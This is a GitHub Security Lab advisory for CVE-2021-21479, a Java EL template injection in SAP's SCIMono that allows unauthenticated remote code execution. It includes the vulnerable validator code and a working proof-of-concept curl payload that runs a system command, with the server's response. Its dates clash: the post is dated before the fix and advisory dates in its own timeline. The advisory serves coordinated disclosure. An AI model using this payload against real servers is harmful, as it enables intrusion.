<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 16, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-227: Server-Side Template Injection leading to unauthenticated Remote Code Execution in SCIMono - CVE-2021-21479</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2020-11-11: Issue reported to SAP Trust Center</li>
  <li>2021-09-02: The issue was fixed on <a href="https://mvnrepository.com/artifact/com.sap.scimono/scimono-server/0.0.19">0.0.19 version</a></li>
  <li>2021-09-02: <a href="https://github.com/SAP/scimono/security/advisories/GHSA-29q4-gxjq-rx5c">Public advisory</a></li>
</ul>

<h2 id="summary">Summary</h2>
<p>A Server-Side Template Injection was identified in SCIMono enabling attackers to inject arbitrary Java EL expressions, leading to unauthenticated Remote Code Execution (RCE) vulnerability.</p>

<h2 id="product">Product</h2>
<p>SCIMono</p>

<h2 id="tested-version">Tested Version</h2>
<p><a href="https://mvnrepository.com/artifact/com.sap.scimono/scimono-server/0.0.18">0.0.18</a></p>

<h2 id="details">Details</h2>

<h3 id="remote-code-execution---javael-injection">Remote Code Execution - JavaEL Injection</h3>

<p>It is possible to run arbitrary code on the server running SCIMono Server by injecting arbitrary Java Expression Language (EL) expressions.</p>

<p>SCIMono uses Java Bean Validation (JSR 380) custom constraint validators such as  <a href="https://github.com/SAP/scimono/blob/master/scimono-server/src/main/java/com/sap/scimono/entity/schema/validation/SchemaIdValidator.java"><code class="language-plaintext highlighter-rouge">SchemaIdValidator</code></a>. When building custom constraint violation error messages, it is important to understand that they support different types of interpolation, including <a href="https://docs.jboss.org/hibernate/validator/5.1/reference/en-US/html/chapter-message-interpolation.html#section-interpolation-with-message-expressions">Java EL expressions</a>. Therefore if an attacker can inject arbitrary data in the error message template passed to <code class="language-plaintext highlighter-rouge">ConstraintValidatorContext.buildConstraintViolationWithTemplate()</code>, they will be able to run arbitrary Java code. Unfortunately, it is common that validated (and therefore, normally untrusted) bean properties flow into the custom error message. <code class="language-plaintext highlighter-rouge">SchemaIdValidator</code> and other custom constraint validators  validate attacker controlled strings which are included in the custom constraint error validation message:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SchemaIdValidator</span> <span class="kd">implements</span> <span class="nc">ConstraintValidator</span><span class="o">&lt;</span><span class="nc">ValidSchemaId</span><span class="o">,</span> <span class="nc">String</span><span class="o">&gt;</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Pattern</span> <span class="no">SCHEMA_NAME_ALLOWED_PATTERN</span> <span class="o">=</span> <span class="nc">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">"(^[a-zA-Z])(\\w)+"</span><span class="o">);</span>

  <span class="nd">@Override</span>
  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isValid</span><span class="o">(</span><span class="nc">String</span> <span class="n">schemaId</span><span class="o">,</span> <span class="nc">ConstraintValidatorContext</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="nf">isValidSchemaId</span><span class="o">(</span><span class="n">schemaId</span><span class="o">,</span> <span class="n">context</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">isValidIdentifierName</span><span class="o">(</span><span class="n">schemaId</span><span class="o">,</span> <span class="n">context</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">isValidSchemaId</span><span class="o">(</span><span class="kd">final</span> <span class="nc">String</span> <span class="n">schemaId</span><span class="o">,</span> <span class="nc">ConstraintValidatorContext</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="nc">SchemasCallback</span><span class="o">.</span><span class="na">isCustomSchema</span><span class="o">(</span><span class="n">schemaId</span><span class="o">))</span> <span class="o">{</span>

      <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="nc">ValidationUtil</span><span class="o">.</span><span class="na">interpolateErrorMessage</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">generateViolationMessage</span><span class="o">(</span><span class="n">schemaId</span><span class="o">));</span>

    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="o">...</span>

  <span class="kd">private</span> <span class="nc">String</span> <span class="nf">generateViolationMessage</span><span class="o">(</span><span class="nc">String</span> <span class="n">attributeName</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="nc">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"The attribute value \"%s\" has invalid value!"</span><span class="o">,</span> <span class="n">attributeName</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Where <code class="language-plaintext highlighter-rouge">ValidationUtil.interpolateErrorMessage()</code> is defined as:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">interpolateErrorMessage</span><span class="o">(</span><span class="nc">ConstraintValidatorContext</span> <span class="n">context</span><span class="o">,</span> <span class="nc">String</span> <span class="n">errorMessage</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">context</span><span class="o">.</span><span class="na">disableDefaultConstraintViolation</span><span class="o">();</span>
    <span class="n">context</span><span class="o">.</span><span class="na">buildConstraintViolationWithTemplate</span><span class="o">(</span><span class="n">errorMessage</span><span class="o">).</span><span class="na">addConstraintViolation</span><span class="o">();</span>
  <span class="o">}</span>
</code></pre></div></div>

<h4 id="poc">PoC</h4>

<p>In order to reproduce this vulnerability you can use the following steps:</p>

<ol>
  <li>Modify the <a href="https://github.com/SAP/scimono/tree/master/scimono-examples/simple-server">SCIMono example server</a> in the following way:
1.1. Add <code class="language-plaintext highlighter-rouge">org.glassfish.jersey.ext:jersey-bean-validation</code> dependency so Jersey enforces Bean Validation
1.2. Add a dummy Schemas callback. eg:</li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.sap.scimono.callback.schemas.SchemasCallback</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sap.scimono.entity.schema.Attribute</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sap.scimono.entity.schema.Schema</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.ws.rs.WebApplicationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.ws.rs.core.Response</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Schemas</span> <span class="kd">implements</span> <span class="nc">SchemasCallback</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">Schemas</span><span class="o">()</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="nc">Schema</span> <span class="nf">getCustomSchema</span><span class="o">(</span><span class="nc">String</span> <span class="n">schemaId</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">createCustomSchema</span><span class="o">(</span><span class="nc">Schema</span> <span class="n">schema</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">Schema</span><span class="o">&gt;</span> <span class="nf">getCustomSchemas</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">deleteCustomSchema</span><span class="o">(</span><span class="nc">String</span> <span class="n">schemaId</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isValidSchemaName</span><span class="o">(</span><span class="nc">String</span> <span class="n">schemaName</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="nc">Attribute</span> <span class="nf">getAttribute</span><span class="o">(</span><span class="nc">String</span> <span class="n">path</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Add the following method to <code class="language-plaintext highlighter-rouge">SimpleServerApplication</code>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="nc">SchemasCallback</span> <span class="nf">getSchemasCallback</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nf">Schemas</span><span class="o">();</span>
    <span class="o">}</span>
</code></pre></div></div>

<ol>
  <li>Force a SchemaId parse error by using a non-existing Id and add an Expression Language payload such as `${1+1}:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; curl 'http://localhost:8080/scim/Schemas/$%7B1+1%7D'
</code></pre></div></div>

<p>The response will contain the result of the EL evaluation:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ {
  "status" : "400",
  "schemas" : [ "urn:ietf:params:scim:api:messages:2.0:Error" ],
  "detail" : "The attribute value \"2\" has invalid value!"
} ]
</code></pre></div></div>

<p>You can run arbitrary system commands such as <code class="language-plaintext highlighter-rouge">id</code>. Eg:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; curl "http://localhost:8080/scim/Schemas/$%7B''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')%7D"
</code></pre></div></div>

<p>which will get you:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ {
  "status" : "400",
  "schemas" : [ "urn:ietf:params:scim:api:messages:2.0:Error" ],
  "detail" : "The attribute value \"java.lang.UNIXProcess@3b1d4c18\" has invalid value!"
} ] 
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">java.lang.UNIXProcess</code> part proves that the process was run.</p>

<h4 id="impact">Impact</h4>

<p>This issue leads to Remote Code execution</p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2021-21479</li>
</ul>

<h2 id="resources">Resources</h2>
<ul>
  <li><a href="https://github.com/SAP/scimono/security/advisories/GHSA-29q4-gxjq-rx5c">https://github.com/SAP/scimono/security/advisories/GHSA-29q4-gxjq-rx5c</a></li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-227</code> in any communication regarding this issue.</p>


   